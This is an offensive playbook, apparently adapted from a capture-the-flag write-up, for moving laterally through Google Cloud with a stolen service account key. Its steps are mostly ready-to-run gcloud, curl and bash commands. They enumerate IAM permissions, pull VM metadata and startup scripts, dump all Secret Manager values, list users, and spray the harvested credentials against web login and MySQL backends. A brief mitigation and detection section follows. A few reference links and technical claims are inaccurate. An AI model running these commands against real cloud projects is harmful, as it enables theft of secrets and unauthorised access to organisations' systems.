# GCP Service Account Lateral Movement — Permission Bruteforcing to Credential Spray

## Chain Summary
**Entry Point:** Stolen GCP service account token or JSON key  
**Severity:** High  
**Source:** https://kabinet.gitbook.io/ctf-writeup/2025/thuderdome/joining-forces-as-one

Leverages compromised GCP service account to enumerate permissions via testIamPermissions, extracts VM metadata credentials, accesses Secrets Manager, enumerates IAM users, then performs credential spray against web application backends using extracted credentials.

---

## Chain: SA Token/Key → Permission Bruteforce → Metadata Credential Extraction → Secrets Access → IAM User Enum → Spray

### [1] GCP Service Account Authentication
- **Trigger:** Service account token or JSON key obtained (e.g., from IMDS, container image, config file, or leaked repository)
- **Prereq:** Valid GCP service account key (JSON format) or active token; gcloud CLI or direct API access
- **Method:**
  ```bash
  # Method 1: Authenticate with service account key
  gcloud auth activate-service-account --key-file=/path/to/sa-key.json
  
  # Method 2: Set credentials as environment variable
  export GOOGLE_APPLICATION_CREDENTIALS=/path/to/sa-key.json
  
  # Method 3: Direct token use (if token already obtained)
  export GCP_ACCESS_TOKEN="<bearer_token>"
  # Subsequent curl requests will use this token
  
  # Verify authentication
  gcloud auth list
  gcloud config get-value project
  ```
- **Yields:** Authenticated GCP context as the service account

### [2] Service Account Permission Bruteforcing (testIamPermissions)
- **Trigger:** Service account authenticated; need to enumerate what actions the account can perform
- **Prereq:** Service account credentials; list of GCP IAM actions to test; resource IDs (projects, compute instances, etc.)
- **Method:**
  ```bash
  # Generate list of common GCP IAM permissions to test
  cat > permissions_to_test.txt <<EOF
  compute.instances.list
  compute.instances.get
  compute.instances.create
  compute.instances.setMetadata
  container.clusters.list
  container.clusters.get
  storage.buckets.list
  storage.buckets.get
  storage.objects.list
  storage.objects.get
  secretmanager.secrets.list
  secretmanager.secrets.get
  secretmanager.versions.access
  iam.serviceAccounts.list
  iam.serviceAccounts.getAccessToken
  sql.instances.list
  sql.instances.connect
  resourcemanager.projects.list
  resourcemanager.organizations.list
  EOF
  
  # Test permissions on current project
  PROJECT=$(gcloud config get-value project)
  gcloud projects get-iam-policy $PROJECT --flatten=bindings[].members --format='value(bindings.role)' | sort -u
  
  # Or via testIamPermissions API
  gcloud projects test-iam-permissions $PROJECT \
    --permissions $(cat permissions_to_test.txt | tr '\n' ',')
  
  # Manual API call for specific resource
  curl -s -H "Authorization: Bearer $GCP_ACCESS_TOKEN" \
    -X POST "https://iam.googleapis.com/v1/projects/$PROJECT:testIamPermissions" \
    -d '{
      "permissions": ["compute.instances.list", "compute.instances.get", "storage.buckets.list"]
    }' | jq .
  ```
- **Yields:** List of permissions the service account possesses; identify high-privilege actions (compute, storage, secrets access)

### [3] GCP VM Metadata Credential Extraction
- **Trigger:** Service account has `compute.instances.get` or `compute.instances.list` permission; need to access VM metadata
- **Prereq:** Compute instances accessible to service account; ability to query instance metadata API
- **Method:**
  ```bash
  # List compute instances in project
  gcloud compute instances list --project $PROJECT
  
  # Get metadata for a specific instance
  INSTANCE_NAME="<instance_name>"
  ZONE="<zone>"
  gcloud compute instances describe $INSTANCE_NAME --zone $ZONE \
    --format='json' | jq '.metadata'
  
  # Extract startup script (may contain credentials or API keys)
  gcloud compute instances describe $INSTANCE_NAME --zone $ZONE \
    --format='get(metadata.items[*].[key,value])' | grep -i "startup\|script"
  
  # Extract service account attached to instance
  gcloud compute instances describe $INSTANCE_NAME --zone $ZONE \
    --format='get(serviceAccounts[0].email)'
  
  # Query instance metadata from within the VM (if you have access)
  curl -s -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://api.internal.app"
  ```
- **Yields:** Instance metadata, startup scripts with embedded credentials, service account email, SSH keys

### [4] Secrets Manager Access (List & Extract Secrets)
- **Trigger:** Service account has `secretmanager.secrets.list` + `secretmanager.versions.access` permission
- **Prereq:** Secrets Manager enabled in project; service account has access; secret names/IDs discoverable
- **Method:**
  ```bash
  # List all secrets in the project
  gcloud secrets list --project $PROJECT
  
  # Get details of a specific secret
  SECRET_NAME="<secret_name>"
  gcloud secrets describe $SECRET_NAME --project $PROJECT
  
  # Access secret value (latest version)
  gcloud secrets versions access latest --secret=$SECRET_NAME --project $PROJECT
  
  # Or via API
  curl -s -H "Authorization: Bearer $GCP_ACCESS_TOKEN" \
    "https://secretmanager.googleapis.com/v1/projects/$PROJECT/secrets" \
    | jq '.secrets[] | {name, created}'
  
  # Access specific secret value
  curl -s -H "Authorization: Bearer $GCP_ACCESS_TOKEN" \
    "https://secretmanager.googleapis.com/v1/projects/$PROJECT/secrets/$SECRET_NAME/versions/latest:access" \
    | jq -r '.payload.data' | base64 -d
  ```
- **Yields:** Plaintext secrets stored in Secrets Manager (database credentials, API keys, passwords, connection strings)

### [5] IAM User Enumeration (Service Account & Human User Discovery)
- **Trigger:** Service account has `iam.serviceAccounts.list` permission; need to find user accounts for spray
- **Prereq:** IAM.serviceAccounts.list permission; project accessible
- **Method:**
  ```bash
  # List all service accounts in project
  gcloud iam service-accounts list --project $PROJECT \
    --format="value(email,displayName,disabled)"
  
  # List all IAM bindings (see who has what roles)
  gcloud projects get-iam-policy $PROJECT --flatten="bindings[].members" \
    --format="table(bindings.role,bindings.members)"
  
  # Extract human users (non-service-account principals)
  gcloud projects get-iam-policy $PROJECT --flatten="bindings[].members" \
    --format="value(bindings.members)" | grep -v "serviceAccount" | sort -u
  
  # Or via API
  curl -s -H "Authorization: Bearer $GCP_ACCESS_TOKEN" \
    "https://iam.googleapis.com/v1/projects/$PROJECT/serviceAccounts" \
    | jq '.accounts[] | {email, displayName}'
  ```
- **Yields:** List of service account emails and human user identities; identify spray targets

### [6] Credential Extraction from Secrets (Database, Application Credentials)
- **Trigger:** Secrets Manager accessed; need to identify and extract credentials for backend systems
- **Prereq:** Plaintext secrets obtained (step 4)
- **Method:**
  ```bash
  # Extract secrets matching credential patterns
  for secret in $(gcloud secrets list --project $PROJECT --format="value(name)"); do
    value=$(gcloud secrets versions access latest --secret=$secret --project $PROJECT 2>/dev/null)
    if echo "$value" | grep -iE "password|user|key|token|credential|db.*url" >/dev/null 2>&1; then
      echo "[+] $secret:"
      echo "$value" | head -c 100
      echo ""
    fi
  done
  
  # Parse JSON secrets
  SECRET_NAME="app-config"
  gcloud secrets versions access latest --secret=$SECRET_NAME --project $PROJECT \
    | jq . > app_config.json
  
  cat app_config.json | jq '.database | {host, port, user, password}'
  cat app_config.json | jq '.api_keys | {service, key}'
  ```
- **Yields:** Database credentials, API keys, application secrets for backend systems

### [7] Credential Spray Against Web Application / Backend Services
- **Trigger:** Credentials extracted from Secrets Manager; need to test against known web/API endpoints
- **Prereq:** Extracted username/password pairs or API keys; knowledge of target endpoints; spray tool or custom script
- **Method:**
  ```bash
  # Approach 1: Extract credentials into spray format
  cat app_config.json | jq -r '.database_users[] | "\(.username):\(.password)"' > creds.txt
  
  # Approach 2: Basic HTTP auth spray
  for cred in $(cat creds.txt); do
    user=$(echo $cred | cut -d: -f1)
    pass=$(echo $cred | cut -d: -f2)
    
    # Test against application endpoint
    response=$(curl -s -X POST "https://backend.internal/api/login" \
      -d "username=$user&password=$pass")
    
    if echo "$response" | grep -q "success\|token\|authenticated"; then
      echo "[+] VALID: $user:$pass"
      # Extract session token or API key from response
      token=$(echo "$response" | jq -r '.token')
      echo "$token" > tokens/$user.token
    fi
  done
  
  # Approach 3: Database credential spray (if backend DB is exposed)
  for cred in $(cat db_creds.txt); do
    user=$(echo $cred | cut -d: -f1)
    pass=$(echo $cred | cut -d: -f2)
    
    # Test MySQL connection
    mysql -h db.internal -u "$user" -p"$pass" -e "SELECT 1;" 2>&1 | grep -q "ERROR" || echo "[+] VALID: $user:$pass"
  done
  ```
- **Yields:** Valid credentials for backend systems; authenticated sessions; tokens for API access; database shell access

---

## Mitigation & Detection

**Prevention:**
- **Service Account Least Privilege:** Grant only required IAM roles; avoid Compute Admin, Storage Admin, or Project Editor roles
- **Workload Identity Federation:** Use federation to eliminate long-lived service account keys; rotate keys quarterly if not federated
- **Key Management:**
  - Rotate service account keys regularly (quarterly or more)
  - Use separate service accounts for each application/workload (not shared)
  - Disable unused service accounts
- **Secrets Manager Best Practices:**
  - Restrict `secretmanager.secrets.get` to only necessary service accounts
  - Use automatic rotation for secrets (password, API keys)
  - Audit all secret access via Cloud Audit Logs
- **VM Security:**
  - Don't embed credentials in metadata or startup scripts; use workload identity
  - Restrict SSH/RDP access to VMs via OS Login or IAM roles
  - Disable instance metadata service if not needed (or restrict via firewall)
- **IAM Conditional Access:** Use VPC-SC to restrict data exfiltration; implement custom IAM conditions

**Detection:**
- **Cloud Audit Logs:** Monitor for:
  - `testIamPermissions` calls (permission enumeration)
  - `secrets.get` / `versions.access` (secret access)
  - `compute.instances.describe` from non-standard sources
  - Service account key creation / authentication
- **Workspace Identity and Access Analyzer:** Alert on overprivileged service accounts
- **Secret Manager Logs:** Alert on secret access outside normal patterns (unusual time, unusual principal, bulk access)
- **Compute Engine:** Monitor for instance metadata queries from non-standard processes
- **Log Aggregation:** Query for sequences: testIamPermissions → secrets.get → unsuccessful auth attempts (spray)

---

## References
- GCP Service Account Documentation: https://cloud.google.com/docs/authentication/service-accounts
- testIamPermissions API: https://cloud.google.com/iam/docs/custom-roles/testing-custom-permissions
- Secrets Manager: https://cloud.google.com/secret-manager/docs
- GCP Security Best Practices: https://cloud.google.com/docs/enterprise/best-practices-for-running-cost-effective-kubernetes-applications-on-gke
- Workload Identity Federation: https://cloud.google.com/docs/authentication/workload-identity-federation
